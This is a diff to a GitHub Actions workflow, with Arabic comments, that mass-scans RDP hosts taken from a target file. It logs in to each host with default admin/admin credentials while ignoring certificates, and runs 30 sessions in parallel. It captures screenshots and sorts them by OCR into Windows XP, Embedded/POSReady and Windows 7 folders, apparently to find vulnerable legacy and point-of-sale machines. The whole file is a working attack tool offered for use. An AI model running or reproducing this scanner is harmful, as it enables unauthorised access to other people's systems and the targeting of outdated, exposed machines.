@@ -1,11 +1,11 @@
-name: RDP Ultra Scanner (30 Parallel & OCR)
+name: RDP Pro Scanner (Parallel & OCR - Fixed)
 on: 
   workflow_dispatch:
     inputs:
       scan_limit:
         description: 'إجمالي الأجهزة للفحص'
         required: true
-        default: '100'
+        default: '30'
 
 jobs:
   capture-screens:
@@ -14,79 +14,78 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Install Advanced Dependencies
+      - name: Install Dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y freerdp2-x11 xvfb fluxbox scrot tesseract-ocr parallel
 
-      - name: Run Ultra Parallel Scan
+      - name: Run Scan & Sort
         run: |
+          # إنشاء مجلدات النتائج
           mkdir -p Results/Windows_XP Results/Windows_Embedded Results/Windows_7 Results/Unknown
 
           DEFAULT_PORT=$(grep "port=" nonla.txt | cut -d'=' -f2 || echo "3389")
           LIMIT=${{ github.event.inputs.scan_limit }}
+          
+          # استخراج الأهداف المطلوبة
           grep -v "port=" nonla.txt | head -n "$LIMIT" > targets.tmp
 
-          scan_and_sort_isolated() {
+          # الدالة الأساسية (مأخوذة من الكود الذي يعمل لديك)
+          scan_and_sort() {
             IP_PORT=$1
+            # توليد شاشة وهمية فريدة لكل عملية لضمان عدم تداخل الصور
             DISPLAY_NUM=$((100 + $PARALLEL_SEQ))
             export DISPLAY=:$DISPLAY_NUM
             
             IP=$(echo $IP_PORT | cut -d':' -f1)
-            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "$DEFAULT_PORT")
+            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "3389")
             
-            echo "[*] Instance $PARALLEL_SEQ -> $IP:$PORT"
-
-            # تشغيل الشاشة الوهمية
+            # تشغيل الشاشة الوهمية والبيئة الرسومية
             Xvfb $DISPLAY -screen 0 1024x768x16 &
             X_PID=$!
             sleep 2
-            
             fluxbox &
             FLUX_PID=$!
-            sleep 1
             
-            # الأمر المصحح (تم حذف الخيارات المسببة للمشاكل واستخدام الصيغة القياسية)
-            # تم استخدام /v:$IP /port:$PORT بشكل منفصل لضمان القبول
-            timeout 45s xfreerdp /v:$IP /port:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto /gfx:off -themes -wallpaper /audio-mode:2 &
+            echo "[*] Connecting to $IP:$PORT on $DISPLAY"
+            
+            # استخدام صياغة xfreerdp القديمة الناجحة مع إضافة التوقيت
+            # تم فصل /v و /port لضمان التوافق التام
+            timeout 45s xfreerdp /v:$IP /port:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto -themes -wallpaper /audio-mode:2 &
             RDP_PID=$!
             
-            # وقت الانتظار المطلوب 30 ثانية
+            # الانتظار المطلوب (30 ثانية لضمان التحميل)
             sleep 30
             
             IMG_NAME="${IP}.png"
             scrot "$IMG_NAME"
             
+            # إغلاق العمليات
             kill $RDP_PID $FLUX_PID $X_PID 2>/dev/null || true
             
+            # فرز الصور باستخدام OCR (Tesseract)
             if [ -f "$IMG_NAME" ]; then
-              # OCR وتحويل النص لاسم الملف والمجلد
               OCR_TEXT=$(tesseract "$IMG_NAME" stdout -l eng 2>/dev/null | tr '[:upper:]' '[:lower:]')
-              DETECTED="Unknown"
               
               if [[ "$OCR_TEXT" == *"windows xp"* ]]; then
-                DETECTED="XP"
                 mv "$IMG_NAME" "Results/Windows_XP/${IP}_XP.png"
               elif [[ "$OCR_TEXT" == *"embedded"* || "$OCR_TEXT" == *"posready"* || "$OCR_TEXT" == *"2009"* ]]; then
-                DETECTED="Embedded"
                 mv "$IMG_NAME" "Results/Windows_Embedded/${IP}_Embedded.png"
               elif [[ "$OCR_TEXT" == *"windows 7"* ]]; then
-                DETECTED="Win7"
                 mv "$IMG_NAME" "Results/Windows_7/${IP}_Win7.png"
               elif [[ -s "$IMG_NAME" ]]; then
                 mv "$IMG_NAME" "Results/Unknown/${IP}_Unknown.png"
               else
                 rm "$IMG_NAME"
               fi
-              echo "[+] $IP Classified as: $DETECTED"
             fi
           }
 
-          export -f scan_and_sort_isolated
-          # تشغيل 30 عملية متوازية
-          cat targets.tmp | parallel -j 30 --env DISPLAY --env PARALLEL_SEQ --env DEFAULT_PORT scan_and_sort_isolated
+          export -f scan_and_sort
+          # تشغيل 30 عملية متوازية باستخدام الدالة المستقرة
+          cat targets.tmp | parallel -j 30 --env DISPLAY --env PARALLEL_SEQ scan_and_sort
           
-      - name: Upload Results
+      - name: Upload Organized Results
         uses: actions/upload-artifact@v4
         with:
           name: Organized-Screenshots
